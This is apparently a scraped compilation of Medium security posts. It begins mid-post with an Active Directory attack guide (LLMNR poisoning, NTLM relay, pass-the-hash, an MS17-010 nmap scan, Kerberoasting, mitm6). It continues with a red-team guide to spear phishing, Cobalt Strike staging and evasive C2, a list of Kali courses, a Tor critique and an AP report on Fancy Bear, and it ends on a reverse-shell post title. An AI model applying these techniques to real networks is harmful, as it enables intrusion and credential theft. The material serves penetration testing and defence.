I wish I could say that Netbios / LLMNR is not as prevalent as it was in 2013; but a vast majority of assessments, result in assessors obtaining NTLMv1 &NTLMv2 hashes and recovering usable credentials. To assist you with cracking your intercepted hashes, there are now advanced frameworks to help with password brute forcing like hate_crack.
I personally had great success using a common word-list that can be obtained for a nominal fee: "" uniqpass"" and the out of box common hashcat ruleset ""best64"". But sometimes complex passwords are enforced, and you're left with no other option but to crack some hashes.
Responder, is arguably the go-to tool for all things related to mitm poisoning and spoofing. Its still actively maintained by Laurent Gaffie
Inveigh, is the native Windows .NET sibling of the Unix/Linux Python based Responder.
Inveigh its core is a .NET packet sniffer that listens for and responds to LLMNR / mDNS / NBNS requests while also capturing incoming NTLMv1 / NTLMv2 authentication attempts over the Windows SMB service.
Both man-in-the-middle tools are designed to assist penetration testers / red teamers that find themselves limited to a Windows system.
2. Relay attacks
The newer MultiRelay tool is maintained by: Laurent Gaffie, which is designed for seem-less integration with SMB relay attacks.
I personally prefer impacket's tools, for relaying and other penetration testing needs. Impacket's tools I found to be reliable and stable on most unixes and run natively on Mac OS. Comparatively to other free open source tools, they leave a relatively small forensic footprint when executed on a host (if you're worried about noise, are trying to be evasive, or have to fend off the Blue Team).
To prepare for some DA pwnage lets get impacket installed.
smbrelayx.py
This module performs the SMB Relay attacks originally discovered by cDc. It receives the list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first authenticate against the client connecting to us.It is implemented by invoking SMB and HTTP Server, hooking to a few functions and then using the smbclient portion. It is supposed to be working on any LM Compatibility level. The only way to stop this attack is to enforce the server SPN checks and or signing. If the authentication against the targets succeed, the client authentication success as well as a valid connection is set against the local smbserver. It's up to the user to set up the local smbserver functionality. One option is to set up shares with whatever files you want to the victim thinks it's connected to a valid SMB server. All that is done through the smb.conf file or programmatically.
ntlmrelayx.py
NTLM Authentication is a challenge-response based protocol. Challenge-response protocols use a commonly shared secret, in this case the user password, to authenticate the client. The server sends a challenge, and the client replies with the response on this challenge. If the challenge matches the one calculated by the server, the authentication is accepted. The NTLM Authentication is a complex protocol, and how it is explained here is the simplification. A very good and detailed description can be found at http://davenport.sourceforge.net/ntlm.html
Both SMBRelay and the newer attacks take advantage of SMB signing, allowing a privileged user to authenticate via SMB / NTLM authentication mechanisms.
After a successful NTLM Relay you'll find the file with hashes named ""IP_samhashes"" in the directory where you executed ntmrelayx.
Using this administrator hash, I obtained DA with the infamous pass-the-hash technique 'using impacket's wmiexec.py
In the scenario above, I was able to relay credentials from one network to another and retrieve an administrator hash that could be passed with wmiexec.py. This particular local administrator hash allowed me to gain Domain administrator without cracking the password, or even having a valid Domain user account beforehand.
3. MS17-010
nmap -Pn -p445 - open - max-hostgroup 3 - smb-vuln-ms17-010 script <ip_netblock>
ETERNALBLUE, ETERNALCHAMPION, ETERNALROMANCE, and ETERNALSYNERGY are four of multiple Equation Group vulnerabilities and exploits disclosed on 2017/04/14 by a group known as the Shadow Brokers. WannaCry / WannaCrypt is a ransomware program utilizing the ETERNALBLUE exploit, and EternalRocks is a worm that uses seven Equation Group vulnerabilities. Petya is a ransomware program that first uses CVE-2017-0199, the vulnerability in Microsoft Office, and then spreads via ETERNALBLUE.
4. Kerberoasting
I have had a lot of success with privilege escalation in an Active Directory domain environment using an attack called Kerberoasting. Tim Medin presented this technique at SANS Hackfest 2014 and since then there have been numerous awesome articles and conference talks on the details of the attack and tools written for different techniques to pull it off (reference links at the bottom of the post).
The Microsoft implementation of Kerberos can be a bit complicated, but the gist of the attack is that it takes advantage of legacy Active Directory support for older Windows clients and the type of encryption used and the key material used to encrypt and sign Kerberos tickets. Essentially, when a domain account is configured to run a service in the environment, such as MS SQL, the Service Principal Name (SPN) is used in the domain to associate the service with a login account. When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service
Example below from mubix's website
5. mitm6
Mitm6 is an incredibly powerful tool for obtaining and escalating privileges on your typical Windows broadcast network. When other attacks above fail on their own; try chaining smbrelay + mitm6 or it's default counterpart ntlmreayx. Use your imagination, and harness the power of mitm6 to gain DA before lunch!
Usage with ntlmrelayx:
mitm6 is designed to be used with ntlmrelayx. You should run the tools next to each other, in this scenario it will spoof the DNS, causing victims to connect to ntlmrelayx for HTTP and SMB connections. For this you have to make sure to run ntlmrelayx with the -6option, which will make it listen on both IPv4 and IPv6. To obtain credentials for WPAD, specify the WPAD hostname to spoof with -wh HOSTNAME(any non-existing hostname in the local domain will work since the DNS server is mitm6). Optionally you can also use the -wa Nparameter with a number of attempts to prompt for authentication for the WPAD file itself in case you suspect victims do not have the MS16-077 patch applied.
mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. The DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. For a full explanation of the attack, see our blog about mitm6 . Mitm6 is designed to work together with ntlmrelayx from impacket for WPAD spoofing and credential relaying.
Reference below: Many parts of this blog are directly cited and copied from the sources below. All credit goes to those, whose amazing work I have either cited or used for obtaining Domain Admin in the realz.
Hack all things and be responsible !!!
https://isc.sans.edu/forums/diary/Using+nmap+to+scan+for+MS17010+CVE20170143+EternalBlue/22574
Written by
","['Penetration Testing', 'Security', 'Cybersecurity']"
Top Five Ways the Red Team breached the External Perimeter,https://medium.com/@adam.toscher/top-five-ways-the-red-team-breached-the-external-perimeter-262f99dc9d17?source=tag_archive---------6-----------------------,"I have been performing “red team” breach assessments for many years. Often the goal is penetrating an external network, and gaining access internally to highly classified data, critical systems or money movement platforms.
This Top 5 summarizes the most efficient tools and techniques used by red teams for the reconnaissance, discovery & exploitation phases of an engagement.
In the world of red teaming, the idiom: “one and done”, applies to red teams. One mislead, and targeted victim, can lead to a chain of attacks that can help a red team obtain a very sophisticated goal.
Open-source intelligence (OSINT) is data collected from publicly available sources to be used in an intelligence context. In the intelligence community, the term “open” refers to overt, publicly available sources (as opposed to covert or clandestine sources)
OSINT is such a vast topic that it’s almost not fair to summarize it’s content numerically. I can honestly only summarize the best data sources I’ve seen, and hopefully provide tips that have helped assessors reach their goal in the shortest time.
Shodan
Linkedin
DNS
Web Archives
OSINT Related“Services”
Google Dorks
Social Media
Manually crawling social media, may provide invaluable information that can not be gathered in an automated fashion, by script or tool. On Instagram, you can find worker’s phone number on business cards. Pictures of WiFi guest passwords on white boards, and happy new hires displaying their new proximity badges. New employees proud of their first day on the job, and posting tons of useful data to social networks.
You can usually find a list for active or past opening via the corporation’s homepage active and archived job listings
Github
Many application developers will commit AWS credentials, or scripts with working credentials. Github and Google Dorking skills go a long way here.
S3 Buckets
Previous Breach Data
Metadata
The name may change but Lync is a great tool for Microsoft Active Directory reconnaissance with buggy Office Communicator 2007 roots. It’s extremely important to understand your target’s communications infrastructure. Lync in a hosted environment, may yield an increased surface area that can help you harvest usernames, and even working credentials.
Microsoft released Office Communicator 2007 to production on 28 July 2007 and launched it on 27 October 2007.[6] It was followed by Office Communicator 2007 R2, released on 19 March 2009
Many older and improperly hardened Microsoft services are just low hanging fruit and easy targets. If a hosted SharePoint environment is compromised, the red team can abuse SharePoint Services to gather information that can directly aid in a more sophisticated attack.
External infrastructure network mapping & Web application fingerprinting
You should now have an extensive body of OSINT knowledge. Ideally you have names, ages and job descriptions of your targets. You should also have their Operating System, what version of Office, and Anti Virus make and type. Determining firewall or proxy devices prior to creation of the payload, is crucial when penetrating the perimeter.
By making a few phone calls you may be able to identify critical information about the environment that can help your spear phish be successful.
Remember you’re not conducting security training during this phish. This is a nation level phish. When you spear phish, try and use the vernacular and tone of the person you’re portraying. Make sure when emulating your false persona, that you have all the details about yourself. Know faux birth-date, SSN number and current location if applicable. If you’ve done your work by now, this should be the easy/fun part.
When sending any e-mails to your carefully, curated list of a few people, try and be as discreet as possible.
Don’t EVER include any links or files when sending your first one or two spear phishes. Don’t try and emphasize urgency, or come off as aggressive. You want to write a nice realistic “note”, and quietly drop it in their inbox.
Payload Generation:
Many of Cobalt Strike’s attacks and workflows deliver a payload as multiple stages. The first stage is called a stager. The stager is a very tiny program, often written in hand-optimized assembly, that: connects to Cobalt Strike, downloads the Beacon payload (also called the stage), and executes it.
An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. The HTML is used to generate the user interface, and the scripting language is used for the program logic. An HTA executes without the constraints of the internet browser security model; in fact, it executes as a “fully trusted” application
Offer a gift, when it’s time to steer the victim towards a website to fill out a survey. After the survey has been completed, send them a working gift card as an example. The payloads have to be obfuscated, “self destruct”, and ideally adapt to sandbox conditions.
All web sites used in the phishing scenarios should appear legitimate, and all files should be presented as valid documents, or applications.
Internal systems for red team need to be: Modern, secure, and to the individual’s preference.
Laptop/Workstation
The worst thing a red team lead can do, is dictate the need to use bad software and hardware due to policy. There may be policies that state you can only use a certain type of equipment provided by the company. If the people controlling the red team exercise are allowing policy to overcome common sense, then their true alliance is to greed and self interest.
Ensure your Lab environments have working Active Directory, Microsoft Office and the current version of Anti Virus software. Ideally you can test your payload against products like Fire Eye or Crowd Strike in a LAB environment.
Ensuring your .docx is working, on a well implemented and secure environment for testing is a necessity when your attack surface area is locked down and well fortified.
It’s a good idea to test out your payloads with Endpoint.
Understanding the networks themselves, and how sophisticated or unsophisticated the systems, and software that sits on Layer 7 is paramount in succeeding.
Epilogue: What about TLS Certificate Pinning?
— — — snip — — —
Earlier, I mentioned that one way to add protection to the staging process is to authenticate the staging server. Last year, the Metasploit Framework gained an optional HTTPS stager that does this. This stager ships with the expected hash of the staging server’s SSL certificate. When the stager connects to the staging server, it checks the server’s SSL cert hash against the value it expects. If they don’t match, it doesn’t download and act on the payload. If they do, it assumes things are good. Pretty neat, right? Ignoring the chicken and the egg problem, this is a way to solve this problem for one protocol.
Occasionally, I get asked, “Raphael, why don’t you add this to Cobalt Strike?” While I think this technique is interesting, I don’t feel this is the right approach for Cobalt Strike. Here’s why:
This technique applies to only one protocol: HTTPS. The HTTPS Beacon isn’t as heavily used as other Beacon options. The HTTPS Beacon’s default self-signed certificate is likely to stick out like a sore thumb. It’s possible to bring a valid certificate into Cobalt Strike, but this is a barrier to fully benefiting from the HTTPS Beacon payload.
— — — snip — — —
Always be cognizant of any firewall or proxy that can stop your payload from “beaconing” out of a restrictive network
C2 Infrastructure
Expendable hosts and services need to be devoid of artifacts. All C2 components should have the ability to be easily destroyed and re-created in an automated fashion.
Ensure that different payloads, and the underlying architecture can not be traced back to the same source.
Old and Aged
Websites and domains are like fine liquors that only become better with time.
Pick a bunch of domains and age them like Château Lafite Rothschild Pauillac. Think outside the box here: CND providers, financial sites, and other generic domains are perfect. Pick a few generic themes for sites and proxies. Then you can hire a freelance web designer to create a faux front web server and establish a decent degree of credibility. When it comes to domains, make sure they’re old, and categorized. The websites need depth, not just a fake superficial shell to be taken seriously.
You want your shell companies to resonate legitimacy; but lack of content or a poorly executed shell site can be worse, and end up tarnishing your brand reputability from inception.
Stealth is a mantra not a bullet point when red teaming. Every action must be calculated beforehand. Every tool must be assessed for its potential ability to cause an indicator of compromise. Every command issued to systems should be coordinated, predetermined and recorded.
Do not use common exploits that may yield results but generate noise or suspicion. This usually leaves the red team member with less options then a network penetration test when performing “snatch and grab” assessments. Many attacks used to quickly escalate privileges, can not be used for this reason, during a carefully executed red team exercise.
From Domain Fronting Theory (2015)
Domain Fronting is now mainstream, and being over utilized by APT actor, and network penetration tester alike.
Once you have persistence on multiple disparate endpoints, you can now focus on the goals of the engagement. Ideally a less common IBM server on the perimeter can be used to quietly ex-filtrate data via encrypted means. A red team can “backdoor”, and create a simply process with a cron job. You can also use SSH and Stunnel.
There are many stealthy ways to establish persistence on less hardened servers and networks, when you have identified that other user orientated networks maybe be very well fortified.
Read everything you can find once you’ve established persistence. Carefully dissect Intranets, documents, Wikis, and E-mails. Try and understand how the services that you are attacking work, and the structure of the organization itself. Meticulously focus all energy onunderstanding the organization and the systems that are your targets.
Written by
","['Security', 'Cybersecurity', 'Penetration Testing', 'Red Team']"
Top Tutorials To Learn Kali Linux For Beginners - Quick Code - Medium,https://medium.com/quick-code/top-tutorials-to-learn-kali-linux-for-beginners-131a654b81ad?source=tag_archive---------1-----------------------,"Kali Linux is the latest Linux distribution from Offensive Security, custom-built for the distinct purposes of performing network security audits and forensic investigations. Kali comes fully loaded with hundreds of integrated tools to perform every aspect of a penetration test.
Kali Linux — Backtrack Evolved: A Penetration Tester’s Guide helps you to develop practical and useful professional skills in the information security industry, while simultaneously delivering the high level of excitement and exhilaration that goes hand-in-hand with the world of computer and network hacking.
Cyber-crime is on the rise and information security is becoming more paramount than ever before. A single attack on a company’s network infrastructure can often result in irreparable damage to a company’s assets and/or reputation.
It is no longer sufficient to merely rely on traditional security measures. In order to ensure the security of critical information assets, it is essential to become familiar with the strategies, tactics, and techniques that are used by actual hackers who seek to compromise your network.
Kali Linux — Backtrack Evolved: A Penetration Tester’s Guide will prepare you to enter the world of professional hacking by ensuring that you are well versed with the skills needed and tools used to compromise the security of enterprise networks and information systems.
#1 Ranking Kali Linux Tutorial! Learn from the pros how to use Kali Linux easily and quickly.
You want to learn hacking with Kali Linux but you do not know where to start? Do you find the command line confusing and intimidating? If yes, this is the perfect course for you. In this Kali Linux tutorial, we start you off with the assumption that you know absolutely nothing about Linux! Starting from scratch you will build up your knowledge on how to use Kali Linux and before you know it you will become fluent with the basic tools and commands not just in Kali, but in most Linux systems.
The course is divided into three parts.
Part 1 — Basics
Part 2 — Administration
Part 3 — Hacking
By the end of the course you will have the skills to:
Please note that this course builds up on some ethical hacking concepts taught in the Hacking For Beginners ethical hacking course. This is another free course provided by Hackers Academy.
In this course, you will learn how to hack web apps with command injection vulnerabilities in a web site of your AWS Linux instance. You will learn how to search valuable information on a typical Linux systems with LAMP services, and deposit and hide Trojans for future exploitation.
You will learn how to patch these web apps with input validation using regular expression. You will learn a security design pattern to avoid introducing injection vulnerabilities by input validation and replacing generic system calls with specific function calls.
You will learn how to hack web apps with SQL injection vulnerabilities and retrieve user profile information and passwords. You will learn how to patch them with input validation and SQL parameter binding. You will learn the hacking methodology, Nessus tool for scanning vulnerabilities, Kali Linux for penetration testing, and Metasploit Framework for gaining access to vulnerable Windows Systems, deploying keylogger, and perform Remote VNC server injection. You will learn security in memory systems and virtual memory layout, and understand buffer overflow attacks and their defenses.
You will learn how to clone a Kali instance with AWS P2 GPU support and perform hashcat password cracking using dictionary attacks and known pattern mask attacks.
Comprehensive walkthroughs of penetration testing labs using Kali Linux.
This course consists of 100% hands-on technical labs, utilizing Kali Linux to hack a variety of intentionally vulnerable operating systems. All of the resources to build the labs are free. Detailed instructions on how to set up the labs are included within this course (VMware Player, Kali Linux, Kioptrix, etc.). To make the most out of this course, it is recommended that you actually perform the activities within the labs rather than just watch the videos.
The main points that will be covered in this course is enumeration, remote exploitation, buffer overflows, and privilege escalation. These labs will show you how to interpret results from tools such as Nmap, Dirb, and enum4linux, and use them effectively to compromise vulnerable systems. Please note that these labs contain spoilers, and it is a good idea to attempt to compromise the vulnerable systems on your own prior to getting the answers from the walk through that’s provided.
The following is an overview of the labs contained within this course:
Lab 1: Download and Configure Kali Linux
Lab 2: Kioptrix Level 1 — Enumeration and Exploitation
Lab 3: Kioptrix Level 2 — Enumeration and Exploitation
Lab 4: Kioptrix Level 3 — Enumeration and Exploitation
Lab 5: Kioptrix Level 5 — Enumeration and Exploitation
Lab 6: Tr0ll 1 — Enumeration and Exploitation
Lab 7: Tr0ll 2 — Enumeration and Exploitation
The following are bonus labs that were added to the curriculum:
Bonus Lab 1: Security Onion Lab Setup with VirtualBox
Bonus Lab 2: Kali Linux Setup with VirtualBox
Bonus Lab 3: Windows 7 Eternalblue Vulnerable VM VirutalBox Setup
Bonus Lab 4: Windows 7 Eternalblue Exploitation and Snort/PCAP Analysis
Bonus Lab 5: Ubuntu Server 12.04 Vulnerable VM VirtualBox Setup
Bonus Lab 6: Ubuntu Server 12.04 Heartbleed Exploitation and Snort/PCAP Analysis.
Learn Web Pentesting , Ethical Hacking and pentesting Techniques with Kali linux Operating System .
This Cyber Security Training will immerse the students into an interactive environment where they will be shown how to scan, test, hack and secure their own systems. The lab intensive environment gives each student in-depth knowledge and practical experience with the current essential security systems. Students will also learn about kali linux tools.
Learn to hack with Kali Linux! Easily create your own hacking labs and do penetration testing
Learn the basics of Ethical Hacking with Kali Linux.
The goal of this course is to help you learn the basic fundamentals of hacking and to give you an introduction to becoming an ethical hacker. This course targets students who have little or no experience in hacking or penetration testing.
In this course you will not only learn the theory behind hacking but you will also learn the practical side of ethical hacking. You will learn how to set up your own virtual lab environment just like the one used in this course. You will be able to follow the step you see in the lecture and replicate them in your own lab in environment. This course also has PDFs for each of the lectures to help you follow along.
Complete Kali Linux Tutorial,Complete penetration testing training,Learn Hacking.
Ethical hacking is testing the IT resources for a good cause and for the betterment of technology. This training will establish your understanding of all the fundamental concepts, processes, and procedures.. You will spend time concentrating on each knowledge area, and studying the tools and techniques, inputs, and outputs associated with each knowledge area.In this course I covered all the topics,it’s a perfect Kali Linux tutorial for you.
In the pre-assessment quiz you’ll face questions from all sections of this Ethical Hacking training. Test your current knowledge and know your strengths and weaknesses.
In Introduction to Ethical Hacking, you will be introduced to various concepts on ethical hacking. You will receive an introduction to the basics of Risk Management and Disaster Recovery. As well as an introduction to Penetration Testing.
You will gain a comprehensive understanding of vulnerability assessment and the tools used in this process. What kind of security measures do you take to protect your facilities, equipment, resources, personnel, and property from damage caused by unauthorized access? In this course, Physical Security, these are questions that we will be answering. Footprinting is the gathering of information related to a particular computer and its users and systems.
Reconnaissance is an exploration that is conducted to gain information. Network scanning is the scanning of public or private networks to find out which systems are running, their IP addresses, and which services they are running. In Port Scanning, you will learn how ports can be scanned, how a hacker can break into your network through the ports, and the countermeasures you can take to protect your device or network.
Banner grabbing is a technique used to grab information about computer systems on a network and the services running its open ports. In this course you will be introduced to enumeration and the many different uses it has in computer systems. This course will include demos on the different tools and uses of enumeration. In this course you will be learning the fundamentals of Linux. We will be pairing this course with demos with a more in-depth look into some of the fundamentals and tools of Linux.
Pentesting is an attack on a system in hopes of finding security weaknesses. In the course Configuring Linux for Pentesting, you will be learning the steps to configure Linux for pentesting and tools used for pentesting on a Linux system. Whenever we login to a computer system, we provide information to identify ourselves. We refer to this as authentication. Ensure that you know everything involved in securing a Windows system against attack. During this course you’ll get into Windows passwords — how they’re created, how they’re stored, and different methods used to crack them.
You will take a good look at spyware, the activities it performs, different types of spyware, and the countermeasures needed in order to prevent hackers from utilizing these types of techniques against your company. You will also spend time studying different types of keyloggers. There are three different types of keyloggers that we see used in today’s environments: hardware, software, and kernel/driver keyloggers. Covering Tracks will be going over various ways that attackers have at their disposal to cover any tracks that may lead to their unwanted eviction, or worse yet, to an audit trail that would lead directly back to them. Trojans and Backdoors is the course where our software is going to be going undercover.
You will discover what viruses and worms are and how they can infect computers and systems. Sniffers is our course where we take a look at Network Sniffing. Social engineering is the art of extorting employees for information.
Become familiar with the following concepts: denial-of-service, distributed denial-of-service, and how the denial-of-service and distributed denial-of-service attacks take place. In the course Session Hijacking, you will learn details about session hijacking, well-known techniques employed by aggressors, the steps involved in session hijacking, various types of session hijacking, tools for hijacking sessions, ways you can protect yourselves from session hijacking, and how pentesting can be used to identify vulnerabilities. Hacking Web and Application Servers, is a course that will give you a good idea about vulnerabilities and attacks available for web servers and web applications. In our course our course Advanced Exploitation Techniques, you will learn what advanced exploitation techniques are and how you can use them in your penetration testing.
Learn how to become an Ethical Hacker using Python and use Kali Linux to perform penetration testing on networks.
Learn network penetration testing, ethical hacking using the amazing programming language, Python along with Kali Linux.
We have designed the course especially for beginners and intermediate level students -no matter where you are in your web site development and coding journey — It is for sure that the future belongs to penetration testers and ethical hackers for protecting enterprise networks and seeking potential vulnerabilities within the network. We also use state-of-the-art editors that are easy to learn and use.
The Comprehensive course to Secure & Crack WEP/WPA/WPA2 key and perform MITM attack From scratch using Kali Linux 2.0.
In this course, you will start as a beginner without any previous knowledge about the hacking, this course focuses on the practical side and the theoretical side.
In this course you will learn how to set up your Kali Linux Environment properly without any issues, and we will learn on Kali Linux 2.0 which is the newest version of offensive security Organization, then you will learn how the Devices communicate with each other, then you will go through the theory behind each method during cracking WEP and WPA2 encryption because this will help you to understand what’s happening in the real world, then you will move to learn how to crack WEP/WPA2 WiFi encryption key using more than method, so if the first method didn’t work with you, you can try another one, and after cracking WEP/WPA2 encryption key you will learn how to perform a sophisticated attacks against any client in the network and this is going to be the gravest and the funniest part of this course, after all of that you will learn how to protect yourself and your accounts from these attacks, and how to prevent your WiFi Access Point against any attack .
This course is intended for beginners and professionals, if you are a beginner you will start from zero until you become a professional, and if you are a professional so this course will increase your knowledge about the hacking.
This course is divided to six parts:
Ethical Hacking And Penetration Testing: Learn To Hack Network, Cyber & Web Security From Scratch, Nmap & Metasploit.
Ethical Hacking is looking for weaknesses and vulnerabilities in system by hacking the target system as a malicious hacker. Governments and companies needs these people to reinforce their security systems against real hackers, but if you can’t find what is wrong about security systems and breakthrough them, you’re missing great career opportunities and other people will grab them.
Complete Ethical Hacking course will show you the exact techniques and strategies you need to know hacking concepts, test security systems, use the right attack tools and master Penetration Testing.
Except if you’re already an excellent ethical hacker, know Trojan concepts, do malware reverse engineering, do webserver attacks, hack web and wireless networks or develop anti-malware softwares, you are going to lose more opportunities and miss career advancements to become an important person for organization, improving their security systems.
In This Ethical Hacking Training, You’ll Learn:
Assuring Security by Penetration Testing.
Justin Hutchens (tutor) currently works as a security consultant and regularly performs penetration tests and security assessments for a wide range of clients. He previously served in the United States Air Force where he worked as an intrusion detection specialist, network vulnerability analyst and malware forensic investigator for a large enterprise network with over 55,000 networked systems. He currently holds a Bachelor’s degree in Information Technology and multiple professional information security certifications, to include CISSP (Certified Information Systems Security Professional), OSCP (Offensive Security Certified Professional), eWPT (eLearnSecurity Web-Application Penetration Tester), GCIH (GIAC Certified Incident Handler), CNDA (Certified Network Defense Architect), CEH (Certified Ethical Hacker), ECSA (EC-Council Certified Security Analyst) and CHFI (Computer Hacking Forensic Investigator).
Disclosure: We are affiliated with some of the resources mentioned in this article. We may get a small commission if you buy a course through links on this page. Thank you.
Written by
","['� Top Courses', ' ✍️ Submit Article', '� Web Dev', '� Mobile Dev', '� Programming', 'Quick Code', 'Cybersecurity', 'Linux', 'Development', 'Programming', 'Kali Linux']"
Tor and its Discontents - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/tor-and-its-discontents-ef5164845908?source=tag_archive---------1-----------------------,"This post deals with problems related to Tor usage that are not technical. I try to look at the human side of things, and I’m quite concerned by the meme of Tor as “panacea solution to arbitrary infosec problems.” I don’t particularly want to fight the privacy activist cult that has developed around Tor, but I feel compelled to state my concerns. (Also, I got triggered by Dan Guido who is writing on the same topic.)
Counterintelligence and security professionals will tell you that you need to adhere to disciplined rules of operation to maintain a strong security posture. That you need to develop a threat model, figure out what you’re trying to protect, and then develop and execute a plan that will provide that protection. This sequence has even been codified in the five step OPSEC process. It is self evident if you think about security (and/or privacy) that you have to follow this sequence.
The “tools first” brigade love to advance “use ${this}” as if whatever ${this} is will implement all sequences of the process for you. Then any tool which fails to address a real threat, or provide the appropriate protection, can be blamed for not addressing arbitrary threat models. This entire approach is backwards.
It doesn’t work well for them. In almost all cases a good VPN is safer (e.g. won’t cooperate with Vietnamese legal authorities); and provides the same protections:
In addition, most really repressive places actually look for Tor and target those ppl. VPNs are used to watch Netflix and Hulu, but Tor has only one use case – to evade the authorities. There is no cover. (This is assuming it is being used to evade even in a country incapable of breaking Tor anonymity.)
In many ways Tor can be riskier than a VPN:
As someone who works with ppl that do actual investigative journalism (among other at risk groups) and need to protect themselves, basically the only thing Tor has going for it is that it is free and essentially frictionless to setup and use. These ppl tend not to be extremely technical, so “download and run this free tool and you’re magically safe” resonates well with them.
“Download and run this and you get a free proxy / VPN; oh, yeah, but you’ll stand out like a fucking glow stick and you have no good reason to use it except as an evasion tool against state authorities. Good luck explaining that when they ask uncomfortable questions.”
Tor is not a new problem for states, they have been working on solutions for years, that includes injecting malicious nodes. We’ve seen this numerous times. It is a reasonable conjecture to assume a significant percentage of Tor nodes are controlled by Mallory.
[Tor Browser Bundle] collapses state-level targeting of browsers to a small set of Firefox versions; TBB is the most risky browser you can possibly run
— Thomas Ptacek (paraphrasing Bruce Leidl)
Tor Browser Bundle is the worst browser possible. This is truth. To follow the reasoning why, there are a few main key issues:
Anonymity is essentially a property of a system that ensures any user is equally likely to be the source of an event (communication, transaction, whatever.) This is one of the reasons that Tor Browser Bundle is pushed so heavily — it creates a large pool of homogeneous users. That is good for anonymity.
Homogeneous users is bad for security because it creates a monoculture, which means the same bugs are present across the entire population. That is generally considered bad in security (although not as a first principle, just as a good rule of thumb.)
Security through diversity is a thing. It provides natural segmentation – smaller clusters of populations have vulnerable traits that are not widely shared by everyone. Diversity is thus a desirable state for security (sometimes.) Diversity is obviously less good for anonymity because the larger the pool of homogeneous users the safer everyone is (risk is distributed across the group and becomes diffuse.) The more potential people that could be suspects, the harder it is to figure out who is actually responsible. That’s the theory anyway…
How Tor Browser Bundle achieves this homogeny is by using a modified version of the Firefox “extended support release” browser. Now, why that is not ideal.
Mozilla, the company that makes Firefox, formalized a release schedule for handling their development. It is based on fixed windows (6 weeks) where builds cascade down a series of different channels (Nightly, Aurora, etc.), each time with more bug fixes and stability. This is transparent and a perfectly acceptable way to manage a software project (Chrome has a similar series of channels, although they move much faster and not on a fixed schedule.)
TBB is a modification of Firefox’s Extended Support Release (ESR) build.
The conclusion is obvious — Tor Browser Bundle is based on a code base that may have publicly patched Critical or High bugs that are months old. And all the Medium and Low bugs are simply never patched (forever days, as they’re sometimes called.)
An adversary can do any number of things to attack the TBB, for example:
What the Tor Browser Bundle does is essentially focus all of the vulnerability research on a single slow moving, poorly defended target. The monoculture that provides protective anonymity – hiding in the herd – exposes the herd to the same vulnerabilities. And everyone is looking for those vulnerabilities.
[Tor Browser Bundle] is the only reason that FireFox is a valuable target — [redacted]
If the only thing between you and your negative outcome is a bug in Tor Browser Bundle, prepare to see your negative outcome.
Firefox is one of the weakest browsers in terms of anti exploitation mitigations, making it less safe to use than alternatives. Tor Browser Bundle is at the tail end of the pipeline of patching (of which it receives only a minimal patch set), making it a risky choice to defeat state level adversaries.
Threat models that include a Global Passive Adversary, or a capable nation state level adversary, or an adversary that doesn’t require an IP address to conduct an investigation, are not well protected by Tor.
Support more content like this.
Written by
","['Rapid Release', 'Privacy', 'Security', 'Infosec', 'Operational Security', 'Cybersecurity']"
Tracing Fancy Bear’s paw prints - Raphael - Medium,https://medium.com/@rsatter/tracing-fancy-bears-paw-prints-6f17e6b82fa4?source=tag_archive---------8-----------------------,"A lot has been written over the past 18 months about Fancy Bear and its role in the U.S. presidential election. The AP’s story, out today, explores how the group’s activities went well beyond the U.S. contest — and how the composite portrait of its 4,700 targets heavily suggests the Kremlin pulls Fancy Bear’s strings.
At the heart of our reporting was a digital hit list supplied by the threat intelligence firm Secureworks. As the AP explains in the story, Fancy Bear (which Secureworks calls “Iron Twilight”) used Bitly links to sneak their phishing messages past Google’s spam filter. Crucially, though, they left the accounts used to craft those links public — meaning that firms like Secureworks could shoulder surf as they crafted one link after the other between March 2015 and May 2016. This blog post from Secureworks explains the technical details, but you can imagine the Bitly links as a trail of digital paw prints that allow an observer to trace Fancy Bear’s movements, minute-by-minute, over 14 months.
When Secureworks recently shared their data with AP, this is what we were confronted with:
We first de-duplicated all the entries because Fancy Bear, as others have noted, often tries to phish its targets repeatedly (sometimes more than a dozen times over the course of a year.) When we removed the chaff (Fancy Bear does extensive testing and generated hundreds of test links) we were left with just over 4,700 unique emails. This was Fancy Bear’s hit list — a vast albeit partial look at who the group wanted to hack.
A team of AP reporters then spent about eight weeks going through the list, trying to match the emails to an actual person. We put names to about half the emails, organizing them by country and into various categories (i.e. military personnel, diplomats or journalists.)
Then we began reaching out, alerting targets to the fact that they were on the list. You’ll read about their experiences in the days and weeks ahead, but reaching so many people was a challenge. Overwhelmingly, we tried to reach people over the phone or even in person. When that didn’t work or wasn’t practical, we tried to reach them via social media. That typically got their attention, although not everyone wanted to talk. Here’s how a former Navy SEAL — targeted twice by Fancy Bear in 2015 — responded when I told him I was working on an important story I’d like to brief him on:
More often, targets were cooperative, and we were able to ask them about their experience and, in some cases, request that they go through their emails and hunt for phishing messages.
This didn’t always work: some people weren’t computer-savvy enough to find the emails; in other cases they assured us the emails had been deleted; and finally in some cases we believe Fancy Bear itself destroyed the emails after having gained control of an account — effectively covering its tracks. We were able to gather a small sample of phishing emails, which we were in turn able to compare to Secureworks’ data. What we found was that, in many cases, the phishing emails arrived a few minutes (or even a few seconds) after the Bitly links were generated. But not always: A couple of emails arrived many days later.
The phishing emails were one of several elements which helped us independently validate Secureworks’ data. It also showed us that Secureworks didn’t get everything: Many phishing emails didn’t correspond to entries on the list, suggesting that the researchers may have missed some of Fancy Bear’s activity.
Something that didn’t make the story: CrowdStrike said late last year that they had found a variant of Fancy Bear malware lurking in a knockoff Ukrainian artillery guidance app. That report got some flak, but I found evidence to back it: Secureworks’ data shows that Fancy Bear tried to break into the Gmail account of the app’s Ukrainian developer in April 2015.
We’ll have more detail on our reporting soon, along with more exciting stories. Meanwhile, if you have any questions about our work, or believe you too may have been targeted by Fancy Bear, I can be reached here.
Written by
","['Cybersecurity', 'Fancy Bear', 'Data Journalism', 'Hacking', 'Russia']"
Undetectable C# & C++ Reverse Shells - Bank Security - Medium,https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15?source=tag_archive---------4-----------------------,"Technical overview of different ways to spawn a reverse shell on a victim machine
